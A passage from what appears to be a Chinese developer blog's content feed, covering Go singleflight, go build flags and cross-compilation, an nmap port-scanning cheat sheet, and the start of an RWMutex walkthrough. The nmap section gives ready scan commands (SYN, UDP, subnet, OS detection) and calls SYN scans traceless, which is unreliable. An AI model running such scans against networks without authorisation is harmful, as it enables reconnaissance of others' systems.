class="token operator">=</span> <span class="token function">newPanicError</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span>val<span class="token punctuation">,</span> c<span class="token punctuation">.</span>err <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">// 如果我们传入的 fn 正常执行了 normalReturn 肯定会被修改为 true</span>        <span class="token comment">// 所以 defer 里可以通过这个标记来判定是否 panic 了</span>        normalReturn <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">// 如果 normalReturn 为 false 就表示，我们的 fn panic 了</span>    <span class="token comment">// 如果执行到了这一步，也说明我们的 fn  也被 recover 住了，不是直接 runtime exit</span>    <span class="token keyword">if</span> <span class="token operator">!</span>normalReturn <span class="token punctuation">&#123;</span>        recovered <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DoChan"><a href="#DoChan" class="headerlink" title="DoChan"></a>DoChan</h4><p>和 do 唯一的区别是 <code>go g.doCall(c, key, fn)</code>,但对起了一个 goroutine 来执行，并通过 channel 来返回数据，这样外部可以自定义超时逻辑，防止因为 fn 的阻塞，导致大量请求都被阻塞。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>g <span class="token operator">*</span>Group<span class="token punctuation">)</span> <span class="token function">DoChan</span><span class="token punctuation">(</span>key <span class="token builtin">string</span><span class="token punctuation">,</span> fn <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;-</span><span class="token keyword">chan</span> Result <span class="token punctuation">&#123;</span>    ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> Result<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    g<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> g<span class="token punctuation">.</span>m <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        g<span class="token punctuation">.</span>m <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>call<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> c<span class="token punctuation">,</span> ok <span class="token operator">:=</span> g<span class="token punctuation">.</span>m<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span> ok <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span>dups<span class="token operator">++</span>        c<span class="token punctuation">.</span>chans <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>chans<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>        g<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> ch    <span class="token punctuation">&#125;</span>    c <span class="token operator">:=</span> <span class="token operator">&amp;</span>call<span class="token punctuation">&#123;</span>chans<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">chan</span><span class="token operator">&lt;-</span> Result<span class="token punctuation">&#123;</span>ch<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    c<span class="token punctuation">.</span>wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    g<span class="token punctuation">.</span>m<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> c    g<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">go</span> g<span class="token punctuation">.</span><span class="token function">doCall</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> key<span class="token punctuation">,</span> fn<span class="token punctuation">)</span>    <span class="token keyword">return</span> ch<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Forget"><a href="#Forget" class="headerlink" title="Forget"></a>Forget</h4><p>手动移除某个 key，让后续请求能走 doCall 的逻辑，而不是直接阻塞。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>g <span class="token operator">*</span>Group<span class="token punctuation">)</span> <span class="token function">Forget</span><span class="token punctuation">(</span>key <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    g<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> c<span class="token punctuation">,</span> ok <span class="token operator">:=</span> g<span class="token punctuation">.</span>m<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span> ok <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span>forgotten <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span>    <span class="token function">delete</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span>m<span class="token punctuation">,</span> key<span class="token punctuation">)</span>    g<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><h4 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h4><p>singleflight 内部使用 waitGroup 来让同一个 key 的除了第一个请求的后续所有请求都阻塞。直到第一个请求执行 fn 返回后，其他请求才会返回。</p><p>这意味着，如果 fn 执行需要很长时间，那么后面的所有请求都会被一直阻塞。</p><p>这时候我们可以<strong>使用 DoChan 结合 ctx + select 做超时控制</strong></p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">loadChan</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span>key <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    data<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">loadFromCache</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> err <span class="token operator">==</span> ErrCacheMiss <span class="token punctuation">&#123;</span>        <span class="token comment">// 使用 DoChan 结合 select 做超时控制</span>        result <span class="token operator">:=</span> g<span class="token punctuation">.</span><span class="token function">DoChan</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            data<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">loadFromDB</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>            <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err            <span class="token punctuation">&#125;</span>            <span class="token function">setCache</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>            <span class="token keyword">return</span> data<span class="token punctuation">,</span> <span class="token boolean">nil</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">select</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> r <span class="token operator">:=</span> <span class="token operator">&lt;-</span>result<span class="token punctuation">:</span>            <span class="token keyword">return</span> r<span class="token punctuation">.</span>Val<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>Err        <span class="token keyword">case</span> <span class="token operator">&lt;-</span>ctx<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> ctx<span class="token punctuation">.</span><span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> data<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="手动forget"><a href="#手动forget" class="headerlink" title="手动forget"></a>手动forget</h4><p>比如1秒内有100个请求过来，正常是第一个请求能执行queryDB，后续99个都会阻塞。</p><p>增加这个 Forget 之后，每 100ms 就能有一个请求执行 queryDB，相当于是多了几次尝试的机会，相对的也给DB造成了更大的压力，需要根据具体场景进去<code>取舍</code>。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Millisecond<span class="token punctuation">)</span>       g<span class="token punctuation">.</span><span class="token function">Forget</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h2><p><a href="https://www.lixueduan.com/posts/go/singleflight/">https://www.lixueduan.com/posts/go/singleflight/</a></p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-编译</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-03-18-Golang-%E7%BC%96%E8%AF%91/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-03-18-Golang-%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><ul><li>-o<ul><li>Output 指定编译输出的名称，代替默认的包名</li></ul></li><li>-i<ul><li>install 已废弃，安装指定的包来完成编译，编译需要的包会自动缓存下来</li></ul></li><li>其他参数都归类为build flags</li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go build <span class="token punctuation">[</span>-o 输出名<span class="token punctuation">]</span> <span class="token punctuation">[</span>-i<span class="token punctuation">]</span> <span class="token punctuation">[</span>编译标记<span class="token punctuation">]</span> <span class="token punctuation">[</span>包名<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="build-flags"><a href="#build-flags" class="headerlink" title="build flags"></a>build flags</h3><p>build flags在build,clean,get,install,list,run,test等命令下都是通用的</p><ul><li><p>-tags ‘tag list’</p><ul><li>构建出带tag的版本</li></ul></li><li><p>-gcflags ‘arg list’</p><ul><li>编译参数go tool compile –help查看所有可用的参数</li><li>-m：打印优化信息</li><li>-N：禁用优化（debug时用到）</li><li>-I：禁止内联优化（debug时用到）</li><li>-c：指定编译是的并发数，默认为1</li><li>-L：错误信息中打印文件全名</li></ul><p>gcflag中的pattern</p><ul><li><p>gcflag传入的方式为： -gcflag&#x3D;”pattern&#x3D; args”,其中pattern代表取值分别为 main,all,std,…,用于指定编译参数作用的范围，args则为对应的编译参数</p></li><li><p><code>main</code>：表示main函数所在的顶级包路径</p></li><li><p><code>all</code>：表示GOPATH中的所有包。如果在modules模式下，则表示主模块和他所有的依赖，包括test文件的依赖</p></li><li><p><code>std</code>：表示Go标准库中的所有包</p></li><li><p><code>...</code>：表示是一个通配符，可以匹配任意字符串（包括空字符串）</p><ul><li>net&#x2F;…表示net模块和它所有子模块</li><li>.&#x2F;…表示当前主模块和所有子模块</li><li>如果 pattern 中包含了 &#x2F; 和 …，那么就不会匹配 vendor 目录。例如: <code>./...</code> 不会匹配 <code>./vendor</code> 目录。可以使用 <code>./vendor/...</code> 匹配 vendor 目录和它的子模块</li></ul><p>举例：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">go</span> build <span class="token operator">-</span>gcflags<span class="token operator">=</span><span class="token char">'main=-N -l'</span> <span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>ldflags ‘flag list’</p><ul><li>链接参数go tool link –help查看可用可用的参数</li><li>-X：注入变量，通常用于版本信息的注入<br>举例：<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token keyword">var</span> <span class="token punctuation">(</span>gitHash   <span class="token builtin">string</span>buildTime <span class="token builtin">string</span>goVersion <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>args <span class="token operator">:=</span> os<span class="token punctuation">.</span>Args<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"--version"</span> <span class="token operator">||</span> args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-v"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Git Commit Hash: %s \n"</span><span class="token punctuation">,</span> gitHash<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Build TimeStamp: %s \n"</span><span class="token punctuation">,</span> buildTime<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"GoLang Version: %s \n"</span><span class="token punctuation">,</span> goVersion<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go build <span class="token parameter variable">-ldflags</span> <span class="token string">"-X 'main.goVersion=<span class="token variable"><span class="token variable">$(</span>go version<span class="token variable">)</span></span>' -X 'main.gitHash=<span class="token variable"><span class="token variable">$(</span><span class="token function">git</span> show <span class="token parameter variable">-s</span> <span class="token parameter variable">--format</span><span class="token operator">=</span>%H<span class="token variable">)</span></span>' -X 'main.buildTime=<span class="token variable"><span class="token variable">$(</span><span class="token function">git</span> show <span class="token parameter variable">-s</span> <span class="token parameter variable">--format</span><span class="token operator">=</span>%cd<span class="token variable">)</span></span>'"</span> <span class="token parameter variable">-o</span> main➜  cmd git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ ./main <span class="token parameter variable">-vs</span>Git Commit Hash: 24ba11ec5e2af192dc619e2555c6604a254690d0 Build TimeStamp: Mon Mar <span class="token number">11</span> <span class="token number">15</span>:44:52 <span class="token number">2024</span> +0800 sGoLang Version: go version go1.20.6 darwin/amd64 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>makefile</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">flags<span class="token operator">=</span>-X main.buildDate<span class="token operator">=</span>`date -u <span class="token string">'+%Y-%m-%d'</span>` -X main.gitHash<span class="token operator">=</span>`git rev-parse --short HEAD`<span class="token target symbol">build</span><span class="token punctuation">:</span>    go build -ldflags <span class="token string">"$(flags)"</span> -o main main.go<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>-mod</p><ul><li>readonly,vendor,mod 1.14版本以后，如果在mod文件里面有指定vendor，则默认使用vendor，否则设置为readonly</li></ul></li><li><p>-race</p><ul><li>同时检测数据竞争状态，只支持 linux&#x2F;amd64, freebsd&#x2F;amd64, darwin&#x2F;amd64 和 windows&#x2F;amd64</li></ul></li></ul><h3 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h3><p>编译跨平台的只需要修改<code>GOOS</code>、<code>GOARCH</code>、<code>CGO_ENABLED</code>三个环境变量即可</p><ul><li>GOOS：目标平台的操作系统（darwin，freebsd，linux，windows）</li><li>GOARCH：目标平台的体系架构32位还是64位（386，amd64，arm）</li><li>交叉编译不支持CGO所以要禁用它</li></ul><p>Windows环境编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SET <span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span>SET <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>darwinSET <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64go build main.goSET <span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span>SET <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linuxSET <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64go build main.go<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Mac环境编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go<span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>windows <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Linux环境编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go<span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>windows <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-端口扫描工具nmap</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2023-12-22-%E7%BD%91%E7%BB%9C-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7nmap/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2023-12-22-%E7%BD%91%E7%BB%9C-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7nmap/</url>
      
        <content type="html"><![CDATA[<h2 id="NMap"><a href="#NMap" class="headerlink" title="NMap"></a>NMap</h2><p>Network Mapper，是一款网络扫描和主机检测的非常有用的工具。</p><p>其基本功能有三个：</p><ul><li>是扫描主机端口，嗅探所提供的网络服务</li><li>是探测一组主机是否在线</li><li>还可以推断主机所用的操作系统，到达主机经过的路由，系统已开放端口的软件版本</li></ul><h4 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h4><blockquote><p>&#x2F;&#x2F; ping扫描</p><p>nmap -sP 10.22.133.11</p></blockquote><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><blockquote><p>&#x2F;&#x2F; 指定端口范围使用-p参数</p><p>nmap 192.169.0.1 -p1-65535</p><p>&#x2F;&#x2F; 如果不指定要扫描的端口，Nmap默认扫描从1到1024再加上nmap-services列出的端口</p><p>nmap 192.169.0.1</p><p>&#x2F;&#x2F; sys扫描（速度快，不会留下痕迹,没有完成三次捂手）</p><p>nmap -sS 192.168.0.10</p><p>&#x2F;&#x2F; Connect扫描跟sys很像，完成了三次捂手</p><p>nmap -sT 192.168.0.10</p><p>&#x2F;&#x2F; 扫描主机并跟踪路由</p><p>nmap –traceroute <a href="http://www.linux265.com/">www.linux265.com</a></p></blockquote><h4 id="一个IP的多个端口"><a href="#一个IP的多个端口" class="headerlink" title="一个IP的多个端口"></a>一个IP的多个端口</h4><blockquote><p>nmap 10.0.1.161  -p20-200,7777,8888</p></blockquote><h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><p>-sU：表示udp scan ， udp端口扫描</p><p>-Pn：不对目标进行ping探测（不判断主机是否在线）（直接扫描端口）</p><p>对于udp端口扫描比较慢，扫描完6万多个端口需要20分钟左右</p><blockquote><p>nmap -sU 10.0.1.161 -Pn</p></blockquote><h4 id="多个IP"><a href="#多个IP" class="headerlink" title="多个IP"></a>多个IP</h4><blockquote><p>nmap 10.0.1.161 10.0.1.162</p><p>nmap 10.0.1.161,162</p><p>nmap 10.0.1.161-162</p><p>&#x2F;&#x2F; 子网网段</p><p>nmap 10.0.3.0&#x2F;24</p></blockquote><h4 id="扫描文件里的IP"><a href="#扫描文件里的IP" class="headerlink" title="扫描文件里的IP"></a>扫描文件里的IP</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@B ~<span class="token punctuation">]</span><span class="token comment"># cat ip.txt</span><span class="token number">10.0</span>.1.161<span class="token number">10.0</span>.1.162<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>nmap -iL ip.txt</p></blockquote><h4 id="排除某IP"><a href="#排除某IP" class="headerlink" title="排除某IP"></a>排除某IP</h4><blockquote><p>nmap 10.0.1.161-162 –exclude 10.0.1.162</p><p>nmap 10.0.1.161-163 –exclude 10.0.1.162-163</p><p>nmap 10.0.1.161-163 –exclude 10.0.1.161,10.0.1.163</p><p>nmap 10.0.1.161-163 –excludefile ex.txt</p></blockquote><h4 id="操作系统检测"><a href="#操作系统检测" class="headerlink" title="操作系统检测"></a>操作系统检测</h4><blockquote><p>nmap -O 192.168.1.100</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-RWMutex</title>
      <link href="/Code/Code-Golang-RWMutex/"/>
      <url>/Code/Code-Golang-RWMutex/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h2 id="sync-RWMutex"><a href="#sync-RWMutex" class="headerlink" title="sync.RWMutex"></a>sync.RWMutex</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote><p>读写互斥锁，可以由多个读者或单个写者持有。RWMutex的零值是未锁定的互斥锁。</p></blockquote><ol><li><p>结构体及其常量</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> RWMutex <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> w           Mutex  <span class="token comment">// 互斥锁</span> writerSem   <span class="token builtin">uint32</span> <span class="token comment">// 写操作等待读操作完成的信号量</span> readerSem   <span class="token builtin">uint32</span> <span class="token comment">// 读操作等待写操作完成的信号量</span> readerCount <span class="token builtin">int32</span>  <span class="token comment">// 读锁计数器</span> readerWait  <span class="token builtin">int32</span>  <span class="token comment">// 获取写锁时当前需要等待的读锁释放数量</span><span class="token punctuation">&#125;</span><span class="token comment">// 最大只支持 1 &lt;&lt; 30 个读锁</span><span class="token keyword">const</span> rwmutexMaxReaders <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">30</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>四种方法</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>rw <span class="token operator">*</span>RWMutex<span class="token punctuation">)</span> Lock         <span class="token comment">// 提供写锁加锁操作</span><span class="token keyword">func</span> <span class="token punctuation">(</span>rw <span class="token operator">*</span>RWMutex<span class="token punctuation">)</span> RLock        <span class="token comment">// 提供读锁加锁操作</span><span class="token keyword">func</span> <span class="token punctuation">(</span>rw <span class="token operator">*</span>RWMutex<span class="token punctuation">)</span> RUnlock      <span class="token comment">// 提供读锁解锁操作</span><span class="token keyword">func</span> <span class="token punctuation">(</span>rw <span class="token operator">*</span>RWMutex<span class="token punctuation">)</span> Unlock       <span class="token comment">// 提供写锁解锁操作</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>读操作可并发重入，写操作是互斥的，读写锁通常用互斥锁、条件变量、信号量实现。</p></li></ol><h3 id="场景-实现"><a href="#场景-实现" class="headerlink" title="场景&amp;实现"></a>场景&amp;实现</h3><ol><li><p>写操作互斥写操作</p><p>读写锁包含一个互斥锁，写锁定必须先获取该互斥锁，如果互斥锁已被协程A获取（或者协程A在阻塞等待读结束），意味着协程A获取了互斥锁，那么协程B只能阻塞等待该互斥锁。</p></li><li><p>写操作互斥读操作</p><p>通过RWMutex.readerCount表示读者数量，不考虑写操作的情况下，每次读写锁将该值+1，每次解除读锁定将该值-1，所以readerCount取值为[0,N]，N为读者个数，实际上最大可支持2^30个并发读者。</p><p>写操作将readerCount变成负数来阻止读操作，当写锁定时将readerCount减去2^30，从而readerCount变成负值，此时再有读锁定检测到readerCount为负值，则开始阻塞等待。真实的读操作个数并不会丢失，只需要将readerCount加上2^30即可。</p></li><li><p>读操作互斥写操作</p><p>读锁定会先将readerCount加1，此时写操作来是发现读者数量不为0，会阻塞等待所有读操作结束。</p></li><li><p>写锁定不会被饿死</p><p>写操作要等待读操作结束后才可以获得锁，写操作等待期间可能还有新的读操作持续到来，如果写操作等待所有读操作结束，很可能被饿死。</p><p>通过RWMutex.readerWait解决，在写操作到来是，会把RWMutex.readerCount值拷贝到RWMutex.readerWait中，用于标记排在写操作前面的读者个数。前面的读操作结束后，除了会递减readerCount，还会递减readerWait值，当readerWait值变为0时唤醒写操作。写操作相当于把一段连续的读划分为两部分，前面的读操作结束后唤醒写操作，写操作结束后唤醒后面的读操作。</p></li></ol><h3 id="源码实现"><a href="#源码实现" class="headerlink" title="源码实现"></a>源码实现</h3><ol><li><p>写锁加锁 Lock()</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>rw <span class="token operator">*</span>RWMutex<span class="token punctuation">)</span> <span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 竞态检测</span> <span class="token keyword">if</span> race<span class="token punctuation">.</span>Enabled <span class="token punctuation">&#123;</span>     <span class="token boolean">_</span> <span class="token 